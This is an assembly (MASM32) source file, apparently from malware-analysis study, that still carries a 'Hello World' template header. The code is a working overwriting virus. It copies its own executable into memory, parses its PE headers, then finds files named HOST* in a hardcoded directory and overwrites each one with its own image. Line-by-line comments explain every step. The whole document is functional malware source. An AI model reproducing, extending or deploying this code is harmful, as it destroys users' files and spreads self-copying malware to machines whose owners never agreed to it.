; *************************************************************************
; 32-bit Windows Console Hello World Application - MASM32 Example
; EXE File size: 2,560 Bytes
; Created by Visual MASM (http://www.visualmasm.com)
; *************************************************************************
                                    
.386					; Enable 80386+ instruction set
.model flat, stdcall	; Flat, 32-bit memory model (not used in 64-bit)
option casemap: none	; Case insensitive syntax

; *************************************************************************
; MASM32 proto types for Win32 functions and structures
; *************************************************************************  
include c:\masm32\include\kernel32.inc
include c:\masm32\include\windows.inc
include c:\masm32\include\masm32.inc
include c:\masm32\include\msvcrt.inc

printf PROTO C, :VARARG
sprintf PROTO C, :VARARG
strcmp PROTO C, lpstr1:DWORD, lpstr2:DWORD
                                  
; *************************************************************************
; MASM32 object libraries
; *************************************************************************  
includelib c:\masm32\lib\kernel32.lib
includelib c:\masm32\lib\masm32.lib  
includelib c:\masm32\lib\msvcrt.lib  

; *************************************************************************
; Our data section. Here we declare our strings for our message
; *************************************************************************
.data
	lpcstrFileName  	db "D:\md\infect\HOST*",0
    ; Pattern for FindFirstFileA / FindNextFileA to search for files beginning with HOST in a specific directory.

	lpcstrFileFullPath  db "D:\md\infect\%s",0
    ; Format string for sprintf to insert a filename into the path

	lpcstrFileFullPathVirus  db "D:\md\infect\%d",0
    ; Format string for sprintf to create a new file path with a number based on tick count (%d = decimal integer).

	lpcstrFileFullPathBuffer db 200 dup(0)
    ; 200-byte buffer (filled with zeros) to store a full path string

	lpcstrFileFullPathBufferVirus db 200 dup(0)
    ; Purpose: Similar to the above, but for storing the virus’s temporary file name path.

	lpcstrPrint		db "File handle: %x", 10, 0
    ; Purpose: Format string for printing a file handle in hexadecimal (%x). 10 is ASCII newline (\n).Used with printf.

	lpcstrName		db "Infecting file: %s", 10, 0
    ; Purpose: Message to show which file is currently being infected.
    
	lpcstre_magic	db "e_magic: %04x", 10, 0
	; Used for displaying the e_magic field from the DOS header.
    
    lpcstrpe_magic	db "NT_HEADERS Magic: %08x", 10, 0
    ; Message for printing the NT_HEADERS signature. 

	lpcstrMachine	db "FILE HEADER Machine: %x", 10, 0
    ; tells CPU architecture


	lpcstrOPMagic	db "OPTIONAL HEADER Magic: %x", 10, 0
    ; Message to print the Magic value from the Optional Header (32-bit vs 64-bit executable).


	lpcstrInfection db "File %s is overwritten!", 10, 0
    ; Message confirming successful infection of a file.


	lpcstrError		db "GetLastError code: %d", 10, 0
    ; Used to print the Windows API error code when something fails.

	hSearchHandle	dd 0
    ; Purpose: Stores the handle returned by FindFirstFileA.

	hFileHandle     dd 0
    ; Stores handle of the file currently being processed (target file for infection).

	hSelfFileHandle     dd 0
    ; Stores handle to the virus’s own file when copying itself.

	lpMemory		dd 0
    ; Pointer to memory allocated by VirtualAlloc to store the file content in memory.

	dwImageBase		dd 0
    ; Base address of the loaded module (program in memory).

	dwImageSize		dd 0
    ; Size of the executable image (used to determine how many bytes to write during infection).

 	gFindData 	WIN32_FIND_DATA <>
    ; Structure used by FindFirstFileA and FindNextFileA to store information about each file found (name, attributes, timestamps, etc.).

; typedef struct _WIN32_FIND_DATA {
;     DWORD dwFileAttributes;
;     FILETIME ftCreationTime;
;     FILETIME ftLastAccessTime;
;     FILETIME ftLastWriteTime;
;     DWORD nFileSizeHigh;
;     DWORD nFileSizeLow;
;     DWORD dwReserved0;
;     DWORD dwReserved1;
;     TCHAR cFileName[MAX_PATH];
;     TCHAR cAlternateFileName[14];
; } WIN32_FIND_DATA;

    dwBytesWritten dd 0
    ; Stores the number of bytes written during WriteFile operation.



; *************************************************************************
; Our executable assembly code starts here in the .code section
; *************************************************************************
.code

start:
	; Use the StdOut API function to display the text in a console.
	                                    
LOAD:
	;Get the base address of the current running process(or the virus)                
	invoke GetModuleHandleA, NULL
    ; GetModuleHandleA is a Windows API function from the kernel32.dll library.
    ; It retrieves a handle (an internal identifier) to a loaded module (DLL or EXE) in the calling process.
    ; If you pass NULL to GetModuleHandleA, it gives you the base address of the current process’s EXE.
	
	mov [dwImageBase], eax 
	;Save ImageBase inside dwImageBase
	
	invoke GetModuleFileNameA, NULL, addr lpcstrFileFullPathBuffer, 200
    ; Stores the full path of the EXE into lpcstrFileFullPathBuffer.
	
	invoke GetTickCount
    ; Gets system uptime in milliseconds (in EAX). Used later to make a unique file name.
	
	invoke sprintf, addr lpcstrFileFullPathBufferVirus, addr lpcstrFileFullPathVirus, eax
    ;Formats a string like:
    ;C:\Users\user\Desktop\Analysis\Morgue\Infect\123456
    ;where 123456 is the tick count.
	
	invoke CopyFileA, addr lpcstrFileFullPathBuffer, addr lpcstrFileFullPathBufferVirus, 0
	; Copies the EXE to the new virus file.
    
	;Open a handle to the new virus file
	invoke CreateFileA, addr lpcstrFileFullPathBufferVirus,GENERIC_READ, 0, 0, OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL

; Opens the copied file for reading. Returns a handle in EAX.

; HANDLE CreateFileA(
;     LPCSTR               lpFileName,   Name (and optional path) of the file or device to open.
;     DWORD                dwDesiredAccess,   Requested access rights (GENERIC_READ, GENERIC_WRITE, etc.).
;     DWORD                dwShareMode,       Sharing options (FILE_SHARE_READ, FILE_SHARE_WRITE, etc.).
;     LPSECURITY_ATTRIBUTES lpSecurityAttributes,   Pointer to security descriptor (usually NULL).
;     DWORD                dwCreationDisposition,   Action to take: CREATE_NEW – Create new, fail if exists. CREATE_ALWAYS – Create new, overwrite if exists. OPEN_EXISTING – Open file if exists. OPEN_ALWAYS – Open if exists, else create. TRUNCATE_EXISTING – Open existing and erase contents. 
;     DWORD                dwFlagsAndAttributes,   	File attributes (e.g., FILE_ATTRIBUTE_NORMAL).
;     HANDLE               hTemplateFile    Handle to template file to copy attributes from (rarely used, usually NULL).
; );


	cmp eax, INVALID_HANDLE_VALUE
	jz ERR
    ; If the handle is invalid, jump to ERR.

	mov [hSelfFileHandle], eax
    ; Store file handle.
								
	invoke GetFileSize, eax, NULL
	test eax, eax
	jz ERR
	mov [dwImageSize], eax
    ; Retrieves file size into EAX. If size is 0, jump to error. and store it in dwImageSize.


	invoke VirtualAlloc, NULL, eax, MEM_COMMIT, PAGE_READWRITE
	mov [lpMemory], eax
	test eax, eax
	jz ERR
    ; Reserves virtual address space in your process (MEM_RESERVE). Commits the memory so you can actually use it (MEM_COMMIT).

    ; LPVOID VirtualAlloc(
    ; LPVOID lpAddress,   Starting address where you want memory allocated. Usually NULL to let Windows pick.
    ; SIZE_T dwSize,     Number of bytes to allocate.
    ; DWORD  flAllocationType,     Flags controlling how memory is allocated: MEM_COMMIT – Allocate physical storage in RAM/pagefile. MEM_RESERVE – Reserve address space without backing it with physical memory yet.
    ; DWORD  flProtect            Memory protection flags: PAGE_READONLY , PAGE_READWRITE , PAGE_EXECUTE_READWRITE
    ; );

    ; When the standard heap is too small or not flexible enough, devs allocate directly from the OS with VirtualAlloc.
    ; but here we use it to Allocate memory the size of the file for reading it into RAM.

	
	invoke ReadFile, [hSelfFileHandle], eax, [dwImageSize], addr dwImageSize, NULL
	test eax, eax
	jz ERR
    ; Reads the entire copied file into the allocated buffer.
	
	invoke CloseHandle, [hSelfFileHandle]
    ; Closes the handle to the copied file after reading it.
	
	invoke DeleteFileA, addr lpcstrFileFullPathBufferVirus
	test eax, eax
	jz ERR 
    ; Deletes the copied file after reading it into memory.



; directly overwriting host files from the virus’s in-memory image won’t work because the PE memory layout differs from its disk layout.
; Instead, the virus copies itself to a new file (named using GetTickCount), reads its contents, deletes the copy, and then overwrites host files with this data.
; Windows prevents opening a handle to the running executable, so the copy avoids this restriction.
; GetFileSize and ReadFile handle reading the virus content.



EXTRACT_PE:	
 	
 	mov eax, [dwImageBase]  ; EAX = base address of loaded file (in memory)
	invoke printf, addr lpcstre_magic, eax
	; This prints the first 2 bytes at the image base (e_magic), which should be "MZ" for a valid DOS header.
	
	mov eax, [dwImageBase]
	mov ebx, [dwImageBase] 
	add ebx, 3ch ;Add e_lfanew RVA
	add eax, [ebx] ;Add value of e_lfanew to EAX (now points to NT_HEADERS)
	xchg eax, ebx ; Swap EAX/EBX so EBX points to NT_HEADERS
	invoke printf, addr lpcstrpe_magic, ebx
	; Prints the NT_HEADERS address, which should start with "PE\0\0" (50 45 00 00 in hex). 
	
	mov eax, ebx ;Pass NT_HEADERS 
	add eax, 4  ;Advanced to FILE_HEADER
	mov eax, [eax] ;Get Machine value
	xor ecx, ecx   ; Clear ECX to prepare for the next operation
	mov cx, ax      ; Keep only the Machine value (lower 2 bytes) because The Machine field in the PE FILE_HEADER is exactly 2 bytes (a WORD)
	invoke printf, addr lpcstrMachine, ecx
    

	
	add ebx, 18h ;Advance to OPTIONAL_HEADER
	mov eax, [ebx] ;Get Magic value
	xor ecx, ecx
	mov cx, ax  ; because the Magic field in the PE OPTIONAL_HEADER is also 2 bytes (a WORD)
	invoke printf, addr lpcstrOPMagic, ecx
	
	add ebx, 38h ;Advance to SizeOfImage  It specifies the total size in bytes of the image (the executable or DLL) when loaded into memory.
	mov ebx, [ebx] ;Get SizeOfImage value
	mov edi, [dwImageSize]  ; we are going to use the edi in the WriteFile function
	mov [dwImageSize], ebx ; Store new SizeOfImage
	
	
FIRST:
	
	;Get the name of the virus executing file
	invoke GetModuleFileNameA, NULL, addr lpcstrFileFullPathBufferVirus, 200

    ; DWORD GetModuleFileNameA(
    ; HMODULE hModule,        // Handle to the module; NULL for current process executable
    ; LPSTR   lpFilename,     // Buffer to receive the path
    ; DWORD   nSize           // Size of the buffer (in characters)
    ; );
 
	
	invoke FindFirstFileA, addr lpcstrFileName, addr gFindData ;Get the first file
    
    ; HANDLE FindFirstFileA(
    ; LPCSTR            lpFileName,   // File name or pattern (e.g. "C:\\folder\\*.txt")
    ; LPWIN32_FIND_DATAA lpFindFileData // Pointer to a structure that receives info about the found file
    ; );

	test eax, eax
	jz ERR
	mov [hSearchHandle], eax ;Save the files search handle
	invoke printf, addr lpcstrPrint, eax
	jmp FIND
	
NEXT:
	invoke FindNextFileA, [hSearchHandle], addr gFindData  ;Find the next file
	test eax, eax
	jz ERR
	jmp FIND
                                    
FIND:
	
	;Construct full file path
	invoke sprintf, addr lpcstrFileFullPathBuffer, addr lpcstrFileFullPath, addr gFindData.cFileName 
	; Formats the full path of the found file into lpcstrFileFullPathBuffer.
	; Example: "D:\md\infect\HOST1234.txt"
	
	;Compare the found file to virus file
	invoke strcmp, addr lpcstrFileFullPathBuffer, addr lpcstrFileFullPathBufferVirus
	test eax, eax 
	jz NEXT
	
	invoke CreateFileA, addr lpcstrFileFullPathBuffer, GENERIC_READ or GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL

	cmp eax, INVALID_HANDLE_VALUE
	jz ERR
	mov [hFileHandle], eax
	
	;Open handle to found file
	invoke printf, addr lpcstrName, addr gFindData.cFileName ;Print found file name
		
WRITE:
	;Overwrite found file with our file
	invoke WriteFile, [hFileHandle], [lpMemory], edi, addr dwBytesWritten, NULL
    
    ; BOOL WriteFile(
    ;  HANDLE       hFile,                 // Handle to an open file (from CreateFile)
    ;  LPCVOID      lpBuffer,              // Pointer to buffer containing data to write
    ;  DWORD        nNumberOfBytesToWrite, // Number of bytes to write
    ;  LPDWORD      lpNumberOfBytesWritten, // Pointer to variable to receive number of bytes actually written
    ;  LPOVERLAPPED lpOverlapped           // For async I/O, usually NULL for synchronous writes
    ;    );



	test eax, eax
	JZ ERR

	invoke printf, addr lpcstrInfection, addr gFindData.cFileName
	; Prints a message confirming the file was overwritten.
	invoke CloseHandle, [hFileHandle]
	jmp NEXT

ERR:
	invoke GetLastError
	mov ebx, eax
	invoke printf, addr lpcstrError, eax   

EXIT:
	; When the console has been closed, exit the app with exit code 0
    invoke ExitProcess, ebx
end start